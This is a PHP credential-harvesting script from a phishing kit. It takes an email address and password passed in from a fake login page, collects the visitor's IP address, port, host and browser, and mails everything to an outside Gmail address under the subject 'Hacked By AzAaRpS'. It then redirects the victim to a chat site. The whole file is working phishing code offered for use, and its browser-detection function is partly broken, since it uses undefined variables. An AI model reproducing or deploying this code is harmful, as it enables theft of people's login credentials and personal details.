<?php
function getBrowser()
{
    $u_agent = $_SERVER['HTTP_USER_AGENT'];
    $bname = 'Unknown';
    $platform = 'Unknown';
    $version= "";

    //First get the platform?
    if (preg_match('/linux/i', $u_agent)) {
        $platform = 'linux';
    }
    elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
        $platform = 'mac';
    }
    elseif (preg_match('/windows|win32/i', $u_agent)) {
        $platform = 'windows';
    }
   
    // Next get the name of the useragent yes seperately and for good reason
    if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Internet Explorer';
        $ub = "MSIE";
    }
    elseif(preg_match('/Firefox/i',$u_agent))
    {
        $bname = 'Mozilla Firefox';
        $ub = "Firefox";
    }
    elseif(preg_match('/Chrome/i',$u_agent))
    {
        $bname = 'Google Chrome';
        $ub = "Chrome";
    }
    elseif(preg_match('/Safari/i',$u_agent))
    {
        $bname = 'Apple Safari';
        $ub = "Safari";
    }
    elseif(preg_match('/Opera/i',$u_agent))
    {
        $bname = 'Opera';
        $ub = "Opera";
    }
    elseif(preg_match('/Netscape/i',$u_agent))
    {
        $bname = 'Netscape';
        $ub = "Netscape";
    }
   

    // see how many we have
    $i = count($matches['browser']);
    if ($i != 1) {
        //we will have two since we are not using 'other' argument yet
        //see if version is before or after the name
        if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
            $version= $matches['version'][0];
        }
        else {
            $version= $matches['version'][1];
        }
    }
    else {
        $version= $matches['version'][0];
    }
   
  
    if ($version==null || $version=="") {$version="?";}
   
    return array(
        'userAgent' => $u_agent,
        'name'      => $bname,
        'version'   => $version,
        'platform'  => $platform,
        'pattern'    => $pattern
    );
}
$ua=getBrowser();
$yourbrowser= ""  . $ua['name'] . " " . $ua['version'] . " System " .$ua['platform'];
$spider =$_GET["email"];
$kirkuk=$_GET["pass"];
$my=$_GET["my"];
$port=$_SERVER["SERVER_PORT"];
$ip = $_SERVER['REMOTE_ADDR'];
print "<font face=arial size=1 color=#FFFFFF>$ip";
$dd=$_SERVER["HTTP_HOST"];
print "<font face=arial size=1 color=#FFFFFF>$dd";
print_r($yourbrowser);
print "<font face=arial size=1 color=#FFFFFF>$yourbrowser";
$to ='
trjan40@gmail.com
';
$subject ='Hacked By AzAaRpS';
$headers = "Content-type: text/html \nFrom: AzAaRpS";$body = "<body><br><table cellspacing=1 cellpadding=2 align=left><tr><td><b><font face=arial size=2 color=#0B9C04>| hacked | &#10004; |</font></b></td></tr><tr><td><font size=1 color=#0939D4><hr> </font><font face=arial size=1 color=#000000> </font></td></tr><tr><td><font size=3 color=#2831E6>email = </font><font face=arial size=3 color=#FF005A> ".$spider." </font></td></tr><tr><td><font size=3 color=#2831E6>pass = </font><font face=arial size=3 color=#FF005A> ".$kirkuk." </font></td></tr><tr><td><font size=1 color=#0939D4><hr> </font><font face=arial size=2 color=#0B9C04> Info : </font></td></tr><tr><td><font size=1 color=#0939D4>Type Chat = </font><font face=arial size=1 color=#000000> ".$my." </font></td></tr><tr><td><font size=1 color=#0939D4>Ip = </font><font face=arial size=1 color=#000000> ".$ip." </font></td></tr><tr><td><font size=1 color=#0939D4>Port = </font><font face=arial size=1 color=#000000> ".$port." </font></td></tr><tr><td><font size=1 color=#0939D4>Host = </font><font face=arial size=1 color=#000000> ".$dd." </font></td></tr><tr><td><font size=1 color=#0939D4>Browser = </font><font face=arial size=1 color=#000000> ".$yourbrowser." </font></td></tr><tr><td><font size=1 color=#0939D4><hr></font><font face=arial size=1 color=#0939D4> Thank you for choosing us. AzAaRpS </font></td></tr><tr><td><font size=1 color=#0939D4>Copyright by AzAaRpS</font><font face=arial size=1 color=#FF0000> https://www.facebook.com/Abdallah.Mohamed15 </font></td></tr></table></body>"; mail($to,$subject,$body,$headers,$ip);?>
<meta HTTP-EQUIV="REFRESH" content="0; url=https://chatps.herokuapp.com/">
